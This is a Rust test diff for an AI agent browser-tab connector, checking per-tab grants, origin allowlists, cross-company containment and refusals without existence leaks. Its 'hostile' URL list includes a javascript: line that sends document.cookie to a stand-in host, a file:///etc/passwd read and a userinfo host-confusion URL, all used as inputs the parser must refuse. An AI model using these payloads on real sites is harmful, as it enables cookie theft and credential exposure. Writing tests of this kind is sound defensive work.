@@ -890,6 +890,252 @@ mod tests {
         assert!(matches!(e, AppError::NotFound(_)));
     }
 
+    #[test]
+    fn the_tab_refusals_map_to_the_right_status_and_leak_no_existence() {
+        // **No oracle.** An ungranted agent must not be able to tell a real tab
+        // id from a made-up one, so both are 403 — never 404.
+        let e = browser_err(BrowserError::NotGrantedForTab {
+            session: "alice".into(),
+            tab: "tb_real".into(),
+        });
+        assert!(matches!(e, AppError::Forbidden(_)), "not-granted is a 403");
+        let e = browser_err(BrowserError::NoSuchTab("tb_madeup".into()));
+        assert!(
+            matches!(e, AppError::Forbidden(_)),
+            "a missing tab must ALSO be 403, or the 404 is the oracle"
+        );
+        // Honest expiry and origin scope are distinct, actionable outcomes.
+        let e = browser_err(BrowserError::TabNeedsLogin { tab: "tb_x".into() });
+        assert!(matches!(e, AppError::Conflict(_)));
+        let e = browser_err(BrowserError::OriginNotAllowed {
+            tab: "tb_x".into(),
+            host: "evil.test".into(),
+        });
+        assert!(matches!(e, AppError::Forbidden(_)));
+        let e = browser_err(BrowserError::TooManyTabs { max: 16 });
+        assert!(matches!(e, AppError::TooManyRequests(_)));
+    }
+
+    /// §8.4's parser, on its own. Everything `host_of` cannot reason about must
+    /// come back `None`, because the caller turns `None` into a refusal.
+    #[test]
+    fn only_http_urls_yield_a_host_and_everything_else_is_refused() {
+        assert_eq!(host_of("https://Mail.Example.com/inbox"), Some("mail.example.com".into()));
+        assert_eq!(host_of("http://example.com:8080/x?y#z"), Some("example.com".into()));
+        // userinfo is not the host — `https://mail.example.com@evil.test/` goes
+        // to evil.test, and a naive parser reads it the other way round.
+        assert_eq!(host_of("https://mail.example.com@evil.test/"), Some("evil.test".into()));
+        assert_eq!(host_of("https://[2001:db8::1]:443/"), Some("[2001:db8::1]".into()));
+        for hostile in [
+            "javascript:fetch('//evil.test?c='+document.cookie)",
+            "data:text/html,<script>1</script>",
+            "file:///etc/passwd",
+            "/relative/path",
+            "https://",
+            "",
+        ] {
+            assert_eq!(host_of(hostile), None, "{hostile} must not yield a host");
+        }
+    }
+
+    /// **T7 — the confused-deputy guard.** A session with the connector grant but
+    /// NO per-tab grant is refused on EVERY verb that names a tab, `read` and
+    /// `screenshot` explicitly included: on an authenticated tab, reading IS the
+    /// exfiltration. And it is refused *before* any chrome can spawn.
+    #[tokio::test]
+    async fn an_ungranted_session_gets_403_on_every_verb_naming_a_tab_including_reads() {
+        let (state, dir) = test_state().await;
+        seed_session(&state, "alice", "tok-alice", true).await;
+        // A real tab exists, and alice has NO grant on it.
+        crate::db::browser_tabs::create(
+            &state.pool,
+            "tb_realtab0001",
+            "https://mail.example.com/",
+            None,
+            &["mail.example.com".to_string()],
+        )
+        .await
+        .unwrap();
+
+        for tool in ["read", "screenshot", "navigate", "click", "request_human_takeover"] {
+            let (st, v) = call(
+                &state,
+                "alice",
+                "tok-alice",
+                tool,
+                json!({
+                    "tab": "tb_realtab0001",
+                    "url": "https://mail.example.com/",
+                    "selector": "#x",
+                    "reason": "hi",
+                }),
+            )
+            .await;
+            assert_eq!(
+                st,
+                StatusCode::FORBIDDEN,
+                "{tool} on an ungranted tab must be 403, got {v}"
+            );
+        }
+        // A made-up tab id is the SAME refusal — no existence oracle.
+        let (st, _) = call(
+            &state,
+            "alice",
+            "tok-alice",
+            "read",
+            json!({ "tab": "tb_doesnotexist99" }),
+        )
+        .await;
+        assert_eq!(st, StatusCode::FORBIDDEN);
+        // Decisively: none of that spawned a browser.
+        assert!(!state.browser.is_running().await, "no chrome may be spawned");
+
+        // ── and the grant flips it ──────────────────────────────────────────
+        crate::db::browser_tabs::grant(&state.pool, "tb_realtab0001", "alice", true)
+            .await
+            .unwrap();
+        assert!(
+            has_tab_grant(&state, "alice", "tb_realtab0001").await,
+            "the per-tab grant is what unlocks the tab"
+        );
+        // …but the CONNECTOR grant is still necessary. Revoke it and the tab
+        // grant alone is not enough.
+        db_connectors::grant(&state.pool, "alice", BROWSER_ID, None, false)
+            .await
+            .unwrap();
+        assert!(
+            !has_tab_grant(&state, "alice", "tb_realtab0001").await,
+            "connector grant is NECESSARY; a tab grant alone must not suffice"
+        );
+        std::fs::remove_dir_all(&dir).ok();
+    }
+
+    /// **T9 — `list_tabs` hides what it must not reveal**, and **T8** — company
+    /// containment is enforced server-side, not merely hidden.
+    #[tokio::test]
+    async fn list_tabs_shows_only_granted_tabs_and_never_crosses_a_company() {
+        let (state, dir) = test_state().await;
+        seed_session(&state, "alice", "tok-alice", true).await;
+
+        let tabs = &state.pool;
+        crate::db::browser_tabs::create(tabs, "tb_granted00001", "https://a.test/", None, &[])
+            .await
+            .unwrap();
+        crate::db::browser_tabs::create(tabs, "tb_ungranted001", "https://b.test/", None, &[])
+            .await
+            .unwrap();
+        // A tab owned by ANOTHER company. Alice is an HQ session (company_id
+        // NULL), so even an explicit own-slug grant must NOT reach it.
+        let other = crate::db::companies::create(&state.pool, "acme", "Acme", "/tmp/acme")
+            .await
+            .unwrap();
+        crate::db::browser_tabs::create(
+            tabs,
+            "tb_othercompany",
+            "https://c.test/",
+            Some(other.id),
+            &[],
+        )
+        .await
+        .unwrap();
+        crate::db::browser_tabs::grant(tabs, "tb_granted00001", "alice", true)
+            .await
+            .unwrap();
+        crate::db::browser_tabs::grant(tabs, "tb_othercompany", "alice", true)
+            .await
+            .unwrap();
+
+        let (st, v) = call(&state, "alice", "tok-alice", "list_tabs", json!({})).await;
+        assert_eq!(st, StatusCode::OK, "{v}");
+        let listed: Vec<String> = v["result"]["tabs"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .map(|t| t["tab"].as_str().unwrap_or_default().to_string())
+            .collect();
+        assert_eq!(
+            listed,
+            vec!["tb_granted00001".to_string()],
+            "only granted, same-company tabs may be listed: {v}"
+        );
+        // The same predicate gates USE, so discovery and enforcement agree.
+        assert!(has_tab_grant(&state, "alice", "tb_granted00001").await);
+        assert!(!has_tab_grant(&state, "alice", "tb_ungranted001").await);
+        assert!(
+            !has_tab_grant(&state, "alice", "tb_othercompany").await,
+            "a cross-company grant must be refused at CALL TIME, not just hidden"
+        );
+
+        // A session with no tab grants gets an empty list, not an error and not
+        // a hint that other tabs exist.
+        seed_session(&state, "bob", "tok-bob", true).await;
+        let (st, v) = call(&state, "bob", "tok-bob", "list_tabs", json!({})).await;
+        assert_eq!(st, StatusCode::OK);
+        assert_eq!(v["result"]["count"], json!(0), "{v}");
+
+        // And a session without even the CONNECTOR grant cannot list at all.
+        seed_session(&state, "carol", "tok-carol", false).await;
+        let (st, _) = call(&state, "carol", "tok-carol", "list_tabs", json!({})).await;
+        assert_eq!(st, StatusCode::FORBIDDEN);
+        std::fs::remove_dir_all(&dir).ok();
+    }
+
+    /// **T10 — honest expiry.** A `needs_login` tab refuses every agent verb
+    /// rather than serving a login wall as if it were data. Fail closed, and
+    /// still before any chrome spawns.
+    #[tokio::test]
+    async fn a_tab_in_needs_login_refuses_agent_verbs() {
+        let (state, dir) = test_state().await;
+        seed_session(&state, "alice", "tok-alice", true).await;
+        crate::db::browser_tabs::create(
+            &state.pool,
+            "tb_expired00001",
+            "https://mail.example.com/",
+            None,
+            &["mail.example.com".to_string()],
+        )
+        .await
+        .unwrap();
+        crate::db::browser_tabs::grant(&state.pool, "tb_expired00001", "alice", true)
+            .await
+            .unwrap();
+        crate::db::browser_tabs::update(
+            &state.pool,
+            "tb_expired00001",
+            &crate::db::browser_tabs::TabPatch {
+                login_state: Some(crate::db::browser_tabs::LOGIN_NEEDED.into()),
+                ..Default::default()
+            },
+        )
+        .await
+        .unwrap();
+
+        for tool in ["read", "screenshot", "navigate", "click"] {
+            let (st, v) = call(
+                &state,
+                "alice",
+                "tok-alice",
+                tool,
+                json!({ "tab": "tb_expired00001", "url": "https://mail.example.com/" }),
+            )
+            .await;
+            assert_eq!(st, StatusCode::CONFLICT, "{tool} on a lapsed tab: {v}");
+        }
+        assert!(!state.browser.is_running().await);
+        // The blockage is raised through the affordance the human already knows.
+        assert!(
+            state
+                .session_activity("alice")
+                .and_then(|a| a.browser_takeover)
+                .is_some(),
+            "a lapsed tab must raise the in-chat ask, not fail silently"
+        );
+        // It is STILL listed, with its state, so the agent can report accurately.
+        let (_, v) = call(&state, "alice", "tok-alice", "list_tabs", json!({})).await;
+        assert_eq!(v["result"]["tabs"][0]["login_state"], json!("needs_login"), "{v}");
+        std::fs::remove_dir_all(&dir).ok();
+    }
+
     // ── FINDING 2: the hand-off must not lie ────────────────────────────────
 
     #[test]
@@ -1222,6 +1468,120 @@ mod tests {
         assert_disposed(&state, "rename_session").await;
 
         state.browser.shutdown().await;
+        std::fs::remove_dir_all(&dir).ok();
+    }
+
+    /// **T11, real chrome — the origin allowlist is a wall, not a hint.**
+    ///
+    /// Drives the ACTUAL endpoint against a granted workspace tab and asserts
+    /// the three things §8.4 claims: an on-allowlist navigation works, an
+    /// off-allowlist one is 403 (and does not move the page), and a granted read
+    /// of the tab succeeds — i.e. the grant path really does reach a live page
+    /// in the persistent context, so the 403s above are refusals rather than
+    /// something that was broken anyway.
+    #[tokio::test]
+    #[ignore = "spawns a real chrome-headless-shell; run with --ignored on a box that has the pinned binary"]
+    async fn real_chrome_an_agent_cannot_navigate_a_granted_tab_off_its_allowlist() {
+        let (state, dir) = test_state().await;
+        if !state.browser.config().executable.exists() {
+            eprintln!("SKIP: no chrome at {}", state.browser.config().executable.display());
+            std::fs::remove_dir_all(&dir).ok();
+            return;
+        }
+        seed_session(&state, "alice", "tok-alice", true).await;
+        // `data:` URLs carry no host, so the allowlist is exercised with two
+        // real loopback origins instead — `127.0.0.1` is allowed, `localhost` is
+        // the same server under a DIFFERENT host, which is exactly the shape of
+        // the same-site-attacker case the allowlist exists for.
+        let (url, server) = {
+            let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+            let addr = listener.local_addr().unwrap();
+            let handle = tokio::spawn(async move {
+                loop {
+                    let Ok((mut sock, _)) = listener.accept().await else { return };
+                    tokio::spawn(async move {
+                        use tokio::io::AsyncWriteExt;
+                        let body = "<title>allowed</title><body>on-allowlist</body>";
+                        let resp = format!(
+                            "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
+                            body.len(),
+                            body
+                        );
+                        let _ = sock.write_all(resp.as_bytes()).await;
+                        let _ = sock.flush().await;
+                    });
+                }
+            });
+            (format!("http://127.0.0.1:{}/", addr.port()), handle)
+        };
+        let off_host = url.replace("127.0.0.1", "localhost");
+
+        crate::db::browser_tabs::create(
+            &state.pool,
+            "tb_originscope1",
+            &url,
+            None,
+            &["127.0.0.1".to_string()],
+        )
+        .await
+        .unwrap();
+        crate::db::browser_tabs::grant(&state.pool, "tb_originscope1", "alice", true)
+            .await
+            .unwrap();
+
+        // On-allowlist: allowed.
+        let (st, v) = call(
+            &state,
+            "alice",
+            "tok-alice",
+            "navigate",
+            json!({ "tab": "tb_originscope1", "url": url }),
+        )
+        .await;
+        assert_eq!(st, StatusCode::OK, "on-allowlist navigation: {v}");
+
+        // Off-allowlist: refused, and the page has NOT moved.
+        let (st, v) = call(
+            &state,
+            "alice",
+            "tok-alice",
+            "navigate",
+            json!({ "tab": "tb_originscope1", "url": off_host }),
+        )
+        .await;
+        assert_eq!(st, StatusCode::FORBIDDEN, "off-allowlist navigation: {v}");
+
+        let (st, v) = call(
+            &state,
+            "alice",
+            "tok-alice",
+            "read",
+            json!({ "tab": "tb_originscope1" }),
+        )
+        .await;
+        assert_eq!(st, StatusCode::OK, "a granted read must work: {v}");
+        assert!(
+            v["result"]["text"].as_str().unwrap_or_default().contains("on-allowlist"),
+            "the tab is still on the page it was allowed to reach: {v}"
+        );
+        assert!(
+            v["result"]["url"].as_str().unwrap_or_default().contains("127.0.0.1"),
+            "the refused navigation must not have moved the page: {v}"
+        );
+
+        // A javascript: URL can never satisfy the allowlist.
+        let (st, _) = call(
+            &state,
+            "alice",
+            "tok-alice",
+            "navigate",
+            json!({ "tab": "tb_originscope1", "url": "javascript:1" }),
+        )
+        .await;
+        assert_eq!(st, StatusCode::FORBIDDEN);
+
+        state.browser.shutdown().await;
+        server.abort();
         std::fs::remove_dir_all(&dir).ok();
     }
 }
